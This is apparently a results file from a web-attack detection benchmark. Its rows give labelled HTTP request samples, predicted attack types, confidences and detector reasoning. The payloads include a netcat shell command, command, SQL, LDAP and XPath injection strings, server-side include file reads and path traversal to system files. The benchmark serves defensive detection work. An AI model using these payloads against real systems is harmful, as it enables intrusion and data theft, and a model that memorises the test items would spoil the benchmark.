dataset_index,sample_id,true_label,true_attack_type,predicted_label,predicted_attack_type,request_route,initial_status,final_status,source,attack_type,request_id,confidence,predicted_reasoning,latency_ms,submit_latency_ms,poll_count,completed,normalized_payloads,retrieval_trace_origin,retrieved_topk_count,retrieved_topk_categories,retrieved_topk_scores,retrieved_topk_payloads,retrieved_topk_source_files,retrieved_topk_line_nos,true_attack_type_in_topk,predicted_attack_type_in_topk,label_correct,attack_type_correct,error
176,patt-command-injection-0801,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,081799e6ee14be9117367e56c46bc021ddf616eee9024d253ed88dc5b29938e7,0.99,"The payload `nc -lvvp 4447 -e /bin/sh;` is a classic Netcat command used to establish a reverse shell, which is a clear Remote Code Execution (RCE) attempt.",658450.4497829912,4895.971535996068,327,True,"[""/profile"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""nc -lvvp 4447 -e /bin/sh;"",""1801""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
27,xml_test-43652,malicious,Command Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,4931.956457992783,4931.927472993266,0,True,"[""/CTvvB3dPI@Ef1D/MPG/wosutT0iznrbIpuosTn/aa/rrq4eSoOee8s/bUftpuEjA471zR/oJW3rvLxbCA6v/czhsdDa1Qe/y1uE.c73NFIAx7cyF/services@.dll"",""tEEens,mpmsSnmt,hmarzd"",""identity"",""application/x-www-form-urlencoded"",""Fri, 28 Apr 06 10:03:15 UTC"",""*/*"",""*;q=0.8"",""*"",""no-store"",""alsnpy1w=Dvbscriptd;Ftdr=    ;    echo ;   w   ;     uname     -a  ;   id;nmAedoola=798780912;uexcade8ssn=4vq;ttisuyia=037655369;Tllq=etne"",""$Version=\""859\"""",""100-continue"",""Tue, 19 Jan 10 24:13:11 UTC"",""Fri, 18 Dec 09 15:46:24 GMT"",""9"",""nrt6 hhbrg=opivawgi"",""/heweyeh/dasja/1E38xsu/gmtfysuu.jsp"",""chunked,deflate;q=0.4"",""Mozilla/5.5 (X11; U; Solaris 6.4; su-d0; rv:3.1.3) Gecko/14138044"",""7737x6163"",""sNBmrn/9.3, lAssi/3.6, g1ti/0.1, ks4/3.8, nbweju/7.0"",""echoashutdownrr""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
416,xml_test-42541,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQL Injection,639440cd1e97c701c6ff848d75f083b46c4ecb146bb99375b474257e1bd8bc84,0.95,"The payload `OR 'c9eprX' LIKE 'Sim%'` contains SQL keywords (`OR`, `LIKE`) and syntax indicative of a SQL injection attempt.",658444.5334999909,4927.7051980025135,327,True,"[""/vyh0ZR3BM/tctxEs853/eE@b0ITiveZC@pYEVeFV/19k0otPrnXbRFE4rrIr/uiThnessz/e9o8ono1X0xL.mdb"",""OR     'c9eprX'    LIKE    'Sim%'"",""hDcnCdf"",""EN"","":sy<t"",""163497"",""nOgPa4bsrE"",""61353795"",""eiExaong5Zuynf"",""mrasc3jawa"",""dboot.iniaRl"",""tec autoexecchavingd"",""auPdE"",""08766856"",""application/zip;q=0.5, text/xml;q=0.3"",""*"",""s-tre5a;q=0.1, oeP-eDaee1u;q=0.3"",""max-age=6227"",""144.73.242.147"",""bwQssyerhhh=2866"",""$Version=\""1\"""",""Wed, 03 Jun 09 20:51:21 UTC"",""\""R_27@H9wdTqDRe2\"""",""oc967Rm"",""bs1as@pton6i0pc.org"",""Sun, 13 Sep 09 09:57:18 UTC"",""Wed, 05 Jan 05 20:27:53 CET"",""\""OdKa-wpU2-1m6YB\"""",""*"",""Wed, 20 May 09 24:21:17 UTC"",""196"",""3.7"",""vncfeta=jgrxinin"",""NTLM b0ExbHI1Y3RnZjdpb0lhaWRwQXU1c2FsZG90dHNqdXRjcw=="",""NTLM YWNjZ0FuRUd0aGVpb3djeWRlb3lnc3RBbGFlZHluczh1b3RidGx0bzNOSUU="",""79786-446"",""/Onatta/tdeat2n/nah2/04eunhie/aFonnER.swf"",""trailers,trailers,gzip"",""Via"",""fnCQhd http://www.Me4ai.it"",""x86"",""1092,0849,8"",""Win95"",""color16"",""8264x986"",""si2s/3.6 94.215.143.145:721"",""identity"",""e2torm/4.8, rnb/5.6, cpieM/3.1, alfi/8.5"",""563 www.aePi5.gif \""edicbUoeitewfnmtlui\"""",""10.31.99.179"",""1876106760"",""-----------------"",""~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
491,xml_test-40394,malicious,SSI,malicious,SSI Injection,queued,202,200,llm_batch,SSI Injection,f9e75ba438e7dc8547e4a230bd16a59b2a595eb67d0c301c8769f9e47444c857,0.95,"The payload `<!-- #include virtual=""d:\windows\autoexec.bat"" -->` is a Server-Side Include (SSI) injection attempt, trying to include a local file, which can lead to information disclosure or RCE.",658449.4246490067,4932.040337997023,327,True,"[""/Oe8e1cttitihbe/ute/elAaiseoln/msVKIkm9/ToaFegl3c3bb.asp"",""8lt"","" e6"",""7UvKnzPbRX"",""6590905"",""lrclotT18ouqeaen"",""qEgMMU@RuOi"",""\\+wasu"",""  cUhome$((sconnectutena97e"","" l"",""00271"",""45751"",""3a4"",""4005"",""audio/*, text/*;q=0.8"",""Wliabgor-Opeep, z-1cVtompy;q=0.8, Btnlr-le;q=0.2, ea-t3e"",""220.104.64.235"",""cFaFSo=eaI%U@;tteoeidrbiee=5721967369;SlovvaeeosAsTl=<!-- #include   virtual=\""d:\\windows\\autoexec.bat\"" -->;z9qwbbrm9hdgaaa=a0rABe2uhsGose4an;oiD=4491"",""Sat, 20 Sep 08 01:20:41 GMT"",""\""K4eepBzju4rF2UhlrnG\"""",""Sun, 31 May 09 16:24:57 GMT"",""Tue, 27 Apr 10 23:00:59 GMT"",""525"",""tmfFi0t=xsgOLeys"",""/katt/eectae/eequft.php4"",""Mozilla/5.5 (Machintosh; U; PPC 2.8; hd-ye; rv:4.2.0) Gecko/71689050"",""3.6 129.92.164.217, 2oA/3.4 235.41.55.205, FTP/2.0 www.rpgypPe.html"",""115.42.201.75"",""-----------------------------------------------""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
401,patt-path-traversal-1111,malicious,Path Traversal,benign,,queued,202,200,llm_batch,,f36fbf92bf0ebce6db80d251ba745150ead74861d40814640ea8c57f6bbb015a,0.7,"The payload consists only of a single backslash `\`. While this character can be part of various attacks, by itself it is not sufficient evidence to confidently flag as malicious without further context.",658434.204759993,4933.873190995655,327,True,"[""/search"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""\\\\"",""2111""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
607,patt-ssi-0657,malicious,SSI,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,4959.352047007997,4959.32306299801,0,True,"[""/download"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""<!--#include file=\""..\\..\\web.config\"" -->"",""1657""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
653,xml_test-48559,malicious,XPath Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,4964.478352005244,4964.4490190112265,0,True,"[""/u2shnSsafim7w/1ongto/38S/sUD3DBB./2cnoIlv.css"",""togmp,dmWn"",""compress"",""http://www.sd9h.st/lecl8/soer/lrjo.tiff"",""ZHJFY2FpNmU0SW5idXhudw=="",""application/x-www-form-urlencoded"",""Sun, 13 Sep 09 01:33:25 GMT"",""Sat, 05 Aug 06 17:40:46 UTC"",""audio/x-wav"",""windows-1250, x-mac-icelandic;q=0.6, iso-8859-2, koi8, x-mac-korean;q=0.6"",""yry9S0hp-cAe0;q=0.9, OdE-set;q=0.0, eefjm-r;q=0.3, esog-t, z7-c3d"",""no-store"",""87.13.72.165"",""pstfbnday8yd6dt=737;3GJwindow.open=64;eogpm7ohriedsn=oxbinefg;ehtOsornutEdn=ef_k;igso8etrosex=dabthtnfr;uds=eJ7z6V1X"",""$Version=\""8\"""",""Thu, 29 Oct 09 17:34:48 GMT"",""W/\"".NpEoPMJ922d-Z-plN\"""",""100-continue"",""w3nw@eoeld2.be"",""Mon, 04 Sep 06 12:57:22 UTC"",""Sun, 08 Apr 07 09:17:00 GMT"",""*"",""*"",""\""SWy.FoMZ1UPqwR0UbO\"""",""85"",""8.7"",""inhRhnt='aaoe0n'"",""NTLM aWlsc3Bvc2V1dG9laHRjZXJXb3V0b2VpaWFlZWVyYWF0dGZ0YWlJbGE="",""NTLM cm1zbFN2OW5hdHlkYmhmb0xrZ1lpRTRhb3F0c3B5ZFNob2UybQ=="",""937233-073734,-13,-768"",""http://www.thntu.it/edonRa/gpel/iD31ek.pl"",""chunked,deflate,trailers"",""Via"",""Mozilla/9.3 (X11; U; Open BSD i386 7.0; wi-Oo; rv:5.7.3) Gecko/52585264"",""StrongARM"",""2908,9185,32"",""Mac OS X"",""color32"",""0026x0337"",""HTTP/8.0 www.NdhwVFa.jpeg, 3.6 www.hOtna.js, 6.0 www.sehtk9.tiff"",""gzip"",""lexe/0.2, mX4rfi/5.5, ue5de/1.9"",""221 www.Tjeo.jpg \""mhTIthjmdIiio6h9eh\"""",""252.38.234.200"",""63432598525498098"",""---------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~"",""4503719512"",""hT9n"",""@7r"",""twPAa-P"",""2953095"",""qR"",""amhomaB"",""12"",""ajsallaL7Fasdt"",""nidsb/enseh/ta/child::node()[   position()=7]    |    Eio/4eT/y/child::text()[position()=3]   or 'mined' = '"",""euhwNmnshutdownsnp"",""1"",""eOo0d8rd""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
249,patt-ldap-injection-0141,malicious,LDAP Injection,malicious,LDAP Injection,queued,202,200,llm_batch,LDAP Injection,681031280311fdd441d2dfeb897c606d24202d365a5d7682a8b308e495fab4d1,0.95,"The payload `(*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))` is a classic LDAP injection pattern, attempting to bypass authentication by manipulating the LDAP filter.",658446.0021979903,4952.358174996334,327,True,"[""/comments"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""query = ("",""*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"",""1141""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
124,kaggle-cmdi-039,malicious,Command Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,4975.700366005185,4975.672499000211,0,True,"[""/admin/tools"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""echo $(whoami)"",""1039""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
602,xml_test-42795,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQLi,3967c354f4cf6ce4720efe00baa00d41c58a44f48fd7ff9a6f567b4bd795ae94,0.95,"The payload contains SQL keywords and syntax like ' OR ' and single quotes, indicative of a SQL injection attempt.",694532.9118639929,4997.05989100039,345,True,"[""/oVE2dcSmbO1bx/eiyHF9UocHedO_u/cE.WuULxmlspvbscriptI/tei/R5nmlu86eo2dasakCt/efNvSxW/ae8rao/m9a93x/c-mTicWRYjy_niGG_/tFwRnRuh_J.exe"",""someo,Tj"",""gzip"",""/ei7asw/joec.cfm"",""aXRjMGgwbGFlMmFkN3BybA=="",""application/x-www-form-urlencoded"",""Tue, 21 Mar 06 02:19:42 UTC"",""audio/*;q=0.1, application/rtf, text/*"",""iso-2022-jp, koi8-r, windows-1252, windows-1253, hz-gb-2312"",""yh5nllsr-i;q=0.8, jhgNh-ce2r;q=0.1, nk-gy7tA;q=0.0, bxine-ksnoie, htoroki-hn;q=0.6"",""only-if-cached"",""244.4.219.50"",""hgEas=rTsqeeitdSRrrltiel;0access_logsamFgupdatedocumentul=1ircpanfri0(o6processing-instructionscriptmochas ;qgofnon=nttaokh;n6hrLot='  OR    'pUe'  <  'X;Dxofnqjru=o@E9;osrf7e9F=190242833"",""$Version=\""3\"""",""Wed, 03 Oct 07 12:36:27 CET"",""\""egCmCDWItk.xwVc5\"""",""100-continue"",""haCtibi@eAtie.it"",""Mon, 07 Apr 08 23:09:45 CET"",""Fri, 26 Mar 10 04:34:32 UTC"",""\""2O.dqBIp0EAAs4v_\"""",""*"",""Fri, 19 May 06 06:38:45 GMT"",""2437"",""7.7"",""no-cache"",""Digest cnonce=\""wprrEoWe\"""",""nsia e7cnesn=ofrrx"",""http://www.0ahDat.com/Vsemk/7uwAhErz/ppiYmcj/etnTh/WtDs9fie.gif"",""Via"",""yxi0aiox/4.5.8.2"",""9.2 214.22.199.248"",""identity"",""4wsorn/0.6, TKqdc8/7.0"",""~~~~~~~~~~~~~~~~~~"",""2lhrtreield0l"",""893"",""eTcticadus"",""T"",""nt"",""likeUnho"",""cstsehtdSo"",""97640"",""jwodnehae"",""61"",""uousamt eeniio""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
675,xml_test-41066,malicious,SQLi,malicious,SQLI RCE,queued,202,200,llm_batch,SQLi/RCE,01a7887dbb16130e4c1d02b59ff2e51bc8c9bc436edc538bd73438e9ec01a6cf,0.98,"The payload contains 'exec xp_regwrite', which is a SQL Server stored procedure used to modify the system registry, indicating a SQL injection attempt leading to remote code execution.",694533.7772030034,5003.226279004593,345,True,"[""/RapL063UPtmp8Tlnode/oacnMzs6fJStfah/jnsOimsysctmex/brmaFgyenoedaAer/rThxm3Lxr/vjBRxI/eUD_/iAK4p9w/pY5M.dll"",""2n"",""07"",""ry"",""jC2X0IP"",""Ko %u]"",""akVUMs"",""er8wCA"",""xtermst<e4y $3rsd-tj to"",""385"",""nOZDVJ9kB"",""201404"",""l8e74h"",""n5;"",""exec    xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\MSSQLServer\\Client\\ConnectTo','sn','REG_SZ','DBMSSOCN,hackersip,80'"",""text/html;q=0.4, audio/basic;q=0.2"",""iso-8859-4;q=0.4, iso-10646-ucs-2, iso-8859-6, iso-8859-9, windows-1255;q=0.1"",""c-nlna, oesLnsl-u, h-sOtsdrf;q=0.1, utetjmu-enQs6s0;q=0.6"",""only-if-cached"",""60.102.82.20"",""uqnfoAE0ooq=36979861;2p=8echoe5s\\ae"",""$Version=\""049\"""",""Fri, 17 Feb 06 01:11:14 UTC"",""W/\""u4k2U1SQ_x00WBC1Jp\"""",""ttrhbztf"",""ttytsmgz@lbtfnlH.de"",""Wed, 20 Apr 05 01:08:12 CET"",""Mon, 17 Nov 08 23:21:18 UTC"",""\""zndjQbm6CAuv2DpY8\"""",""*"",""\""jH.HSSGdokJL@Wxsx\"""",""2"",""1.5"",""no-cache"",""NTLM c3RhdnNuaU9hMWF0VHRnczFzMTF0N29wZWl4d2NlTG5ubg=="",""Digest algorithm=MD5"",""-4"",""http://www.7e5oE.biz/6h6oTe/l2dh1t/qrtti/ednI.pdf"",""trailers,trailers"",""Max-Forwards"",""Mozilla/4.2 (X11; U; Linux i386 9.1; hn-yv; rv:4.4.1) Gecko/20419719"",""PowerPC"",""2063,773,32"",""Win95"",""color16"",""7677x541"",""2.0 129.42.145.227:41, 8.4 www.yin12Eio.css, 8.8 www.de7rrn.html:10207"",""deflate"",""uohtr/6.5, oeo/0.4"",""764 76.214.33.91 \""Rbeodtq\"" \""Fri, 19 Mar 04 18:10:47 GMT\"""",""32.32.219.84"",""54708069609443708"",""-------------"",""~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
383,sample-383,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,de91753b2ffbe1045d1d344e32dc9bbf82968b7de24b6803cb37270e6f9da442,0.97,"The payload contains multiple '..%EF%BF%BD' (obfuscated '../') sequences and targets 'boot.ini', which is a classic path traversal attempt. The 'commix' user agent also suggests an attack tool.",694543.7556160032,5010.389376009698,345,True,"[""/rest/products/search"",""..��../..��../..��../..��../..��../..��../boot.ini"",""commix/v4.2.dev1 (https://commixproject.com)"",""*/*"",""application/x-www-form-urlencoded""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
504,xml_test-42343,malicious,SQLi,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,5015.099006006494,5015.070301000378,0,True,"[""/k6YV2iGAN@gcL6iO3/dtmfGSsettyeleOaSl/sduooeiyo68tcsxcs/9.2kQ@M945fIdn3GsX-/pAahwihnr/z@dPL/hx_tqes2tGNpZ/ndiar.html"",""EltEpatn"",""7657134"",""aeiygloais"",""i84AmorisT"",""gsirtg"",""OrigText'OR'idnSnt'    =  'jMi'"",""arlEeetsl"",""document0tdoqGEicet6"",""131"",""66497735"",""7ba"",""|"",""+catnlsei@susw xp_"",""npuRn0emp"",""image/jpeg;q=0.7"",""hz-gb-2312;q=0.5, euc-jp"",""*;q=0.6"",""no-cache"",""234.69.56.127"",""likeuM8D=9250156;8tirCslhofs=qtiWeie4(;ttypo=140058;pDirveiwgans=r-B-8Kv9tN;sGrf=ih(mnt5|il8fetcs0siAo"",""$Version=\""054\"""",""Wed, 11 Apr 07 03:40:02 CET"",""W/\""W3Dl8Wik9y5E8q13ewRG\"""",""100-continue"",""DiEa@y1ebyi.uk"",""Sun, 12 Jul 09 03:08:24 CET"",""Tue, 07 Sep 04 09:19:21 CET"",""*"",""\""4dzFvPJ7-3442tcmPWv\"""",""Wed, 09 Jul 08 24:27:17 UTC"",""5345"",""5.2"",""no-cache"",""nrRny etsaey=elewdabt"",""baldw 1aneseaa=tt40ou"",""-42018,-510767"",""http://wa5mQn.be/uaGeedc/tuEta.dll"",""gzip;q=0.6"",""Proxy-Authorization"",""nwohaIsid (h9F46uPIgQ; ejaOjjwRF)"",""x86"",""695,8049,32"",""Mac OS X"",""color32"",""999x243"",""6.0 212.102.218.17:00182, 6.6 www.ttrhhrn.jpg, HTTP/6.2 www.aoasi.jpg"",""deflate"",""eEtha/8.4"",""478 44.68.67.163:8 \""haHdehmpgh\"""",""171.143.1.2"",""51653386435804651"",""----------------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
665,xml_test-45315,malicious,Path Traversal,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,5023.853445003624,5023.82613599184,0,True,"[""/opNnrctdihrhpoueiirh/dleiiiGThoEOc1oxl/3enib2SeaDh.aspx"",""2080927"",""j1rjd1@h06Ek"",""a/rcrl"",""text/plain;q=0.3"",""cp-936;q=0.4"",""r9af-esshY, 9wtNft-yi4he6, 6fh4yrit-aihOeq1n"",""no-cache"",""as=tiw5nana| rsn 2xfsamea;el2hemoeRe0=/../../../Inetpub/iissamples/rata/on/orornsnaon/ital.cgi;tethngiearc=daetla;4psta9jsaliusEi=mlocation|ehcmde/sd6/-w6iu&r;oEnl=tvcXH40lo34F"",""$Version=\""015\"""",""Thu, 21 Jan 10 15:34:58 CET"",""100-continue"",""Mon, 30 Jun 08 04:07:27 UTC"",""Fri, 30 Jun 06 07:58:10 CET"",""\""JZRGl5-DL7xSCXbT\"""",""*"",""\""sGqva@JMfanmMh6bX4dU\"""",""37"",""3.4"",""no-cache"",""Basic dW5ycFRjMm06d21ubmE="",""Digest cnonce=\""otos\"""",""0-"",""/Dgvonp/t6aEnyr6.gif"",""chunked;q=0.3,gzip;q=0.0"",""If-Unmodified-Since"",""Mozilla/6.4 (Machintosh; U; PPC Mac OS X 3.1; rr-kg; rv:5.9.6) Gecko/70969154"",""MIPS"",""WinNT"",""color8"",""sohrl/2.0 www.hIsrocLu.css, 3.3 241.227.88.209"",""deflate"",""862 138.235.187.151 \""taonetlreetepa7\"" \""Fri, 19 Nov 04 03:03:30 CET\"""",""74.25.201.88"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
79,xml_test-42113,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQLi,df51f8e381bbff278b8ba76f000c1566af3b269c8e3158e65ba56bdcea143c5b,0.95,"The payload contains SQL keywords and syntax like ' OR ' and 'BETWEEN' with single quotes, indicative of a SQL injection attempt.",694547.969651001,5026.18482800608,345,True,"[""/iU/Gsdhoons6tkn/4nt10hdi/rtnetelz.cfm"",""eaetnoigtyregie"",""EM"",""Torlsimai)tl("",""=m"",""'    OR   'sdea'     BETWEEN   'R'     AND 'T"",""hro:eniu"",""text/html;q=0.6, audio/basic;q=0.9"",""*"",""jbtaonjw-e, qss-y, anUoj-sinu, tcvdpAx-qlot, reoskhe4-i"",""only-if-cached"",""139.71.160.209"",""nrwnnlwow=neav3youlvayoo3Q"",""$Version=\""34\"""",""Fri, 01 Jul 05 21:43:44 UTC"",""\""36ABV77V@jd_sdUj\"""",""oeeEja9t=tncldfia;etnq3hno=qcai6udr"",""jqr1h@steT4irua.uk"",""Mon, 14 May 07 04:50:50 GMT"",""Fri, 21 Mar 08 17:55:01 CET"",""\""PE9nmEeB@c_lsX9O\"""",""\""1hcSvu90ABX8mDmFjHC\"""",""Wed, 03 Oct 07 13:22:10 CET"",""153"",""0.9"",""NslsrH='er'"",""Digest uri=/wSot5/LjitAzt.php3"",""NTLM cmVvQmlubGRvaXdkbnRjc3N5anN4cmFzbTZuZWJla2RzdW9hdQ=="",""80-3804,023297-91,09-"",""http://www.acpe.gov/tnobh0ao/7ttbtIo/leeh/hsrrteY.doc"",""trailers,chunked"",""Proxy-Authorization"",""Mozilla/3.7 (X11; U; Unix 3.5; ll-ne; rv:7.8.5) Gecko/38987810"",""Sparc"",""7194,078,8"",""Windows 95"",""color32"",""830x020"",""4.1 www.dhejc5e.jpeg, 0.4 202.238.59.67, HTTP/6.2 www.ilSdmbnH.html"",""deflate"",""rcbt/8.5, asrs/2.2, wsnl/5.1, trldRe/2.1"",""310 236.101.41.30 \""heS1\"" \""Tue, 01 Aug 06 04:08:43 UTC\"""",""229.231.134.44"",""912151407"",""-----------------"",""~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
530,xml_test-36865,malicious,LDAP Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,5030.111605010461,5030.084785001236,0,True,"[""/N.M4_tbetweenRKNd7Q4g.bin"",""r"",""074"",""ie>vshttp7erasNvo"",""075"",""9311"",""3006"",""55"",""bPso|sertj+sa"",""dR"",""fia(er"",""3ajl"",""*/*"",""*"","")  (|  (displayName=had*)(name    = had*)(mail=had*)"",""no-cache"",""17.48.219.199"",""ie4leeaaw=9f<wp-hho"",""$Version=\""498\"""",""Sat, 17 Nov 07 22:43:08 GMT"",""W/\""mnWVuBc9h.e5LQFzDJL\"""",""100-continue"",""Thu, 19 Mar 09 18:04:43 CET"",""Mon, 04 Jan 10 13:52:16 UTC"",""\""nLMIvQJXW6d_8J8Yx_\"""",""*"",""*"",""5"",""1.6"",""no-cache"",""NTLM VGhldGpocnR0dHJpdjhjdG9ocnNuY2Vhc25leWZ5ek9ybg=="",""NTLM aXBoa3IzdGV2cnRjb0VhZUVvbzl5YXQ4dWU1V09zYWFkZXRlbmlsYQ=="",""/oktGlvoi/clbPA/eotvolnn.js"",""trailers,chunked,gzip"",""If-None-Match"",""Mozilla/5.4 (Machintosh; U; Mac OS X 9.9; ok-en; rv:6.4.0) Gecko/92128848"",""2222,7626,16"",""color8"",""9247x246"",""9.0 183.44.67.255:68, HTTP/6.9 www.easw.shtml"",""gzip"",""207.34.209.252"",""-----------------------------------------"",""~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
443,patt-ssi-0577,malicious,SSI,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,5040.53393099457,5040.498521004338,0,True,"[""/auth"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""<!--#include file=\""..\\..\\web.config\"" -->"",""1577""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
36,patt-ssi-0529,malicious,SSI,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,5071.611710009165,5071.585099998629,0,True,"[""/search"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""<!--#include file=\""..\\..\\web.config\"" -->"",""1529""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
32,xml_test-41404,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQLi,3106597078581328a6a54177e142a267bcad7541726c333aefe52cd6d158ecb4,0.95,"The payload contains SQL keywords and syntax like 'OR' and single quotes, indicative of a SQL injection attempt.",694730.704275993,5074.97688899457,345,True,"[""/hC/pe9rsgEato/B-74X1p1TXB0FO/eThaS@9Z/CiiexechVconnectl6ea4M9x/awesnSshiotsd.aspx"",""ta,laet"",""compress"",""http://www.fahysa.com/tPengeuR/rnae39iU/np6sto6c.swf"",""dGpwcG5obnJnYWxzdWVpYw=="",""application/x-www-form-urlencoded"",""Sun, 01 Jul 07 23:12:59 GMT"",""Fri, 06 Oct 06 13:57:12 GMT"",""application/rtf, text/plain;q=0.1"",""*"",""nfc7nc6-nfadl;q=0.8, c9se-h;q=0.1"",""max-stale=56020"",""87.5.203.76"",""n0=7597;idt39Xks='ta;na=82;btisaytrk0cH=27711540;rfThihr=Oetrasleax"",""$Version=\""59\"""",""Sat, 21 Nov 09 16:17:00 CET"",""\""rHeFjrsZGZRJDQJiVfX\"""",""5ERmu=ncdsee"",""xttrniQd@tSeAtnO.net"",""Sun, 18 May 08 09:14:33 CET"",""Sat, 18 Mar 06 18:45:56 CET"",""\""SBsCTqXFyrKc5bKe6G5\"""",""*"",""*"",""28"",""2.2"",""no-cache"",""Digest opaque=\""ia4zuj\"""",""cTtsb nlsttnre=nmx5nae7"",""24-"",""/eod0.pdf"",""trailers,trailers,gzip"",""If-None-Match"",""rgGYBDmOyg http://www.dsoecx.gov"",""StrongARM"",""0223,7526,32"",""Windows 98"",""color32"",""1178x5140"",""FTP/4.6 231.27.85.77"",""identity"",""etntne/4.1, Iossd/8.2"",""643 191.194.177.159 \""m5pnsfytke\"" \""Thu, 04 Dec 08 02:42:59 GMT\"""",""172.76.114.81"",""15055892627895380"",""--------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""OR   'nl0st'     = 'Sim' 'ple'"",""88435856"",""sn(iez"",""hno"",""rdeOwstebpCS"",""524"",""e"",""e%uehome""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
510,patt-ldap-injection-0172,malicious,LDAP Injection,malicious,SSRF Command Injection,queued,202,200,llm_batch,SSRF/Command Injection,b676ada59d00637d467d3713c7143e3ce3fe0105be4f03c63fcc5108333095ef,0.9,The payload contains a code snippet attempting to make an HTTP request to an internal 'ctf.web' host with parameters suggesting command execution or information disclosure ('action=dir admin*)(password=#{flag}#{char}')) indicative of SSRF or command injection.,694734.8583170096,5076.567462005187,345,True,"[""/api/items"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""r = Net::HTTP.get(URI(\""http://ctf.web?action=dir"",""admin*)(password=#{flag}#{char}\""))"",""1172""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
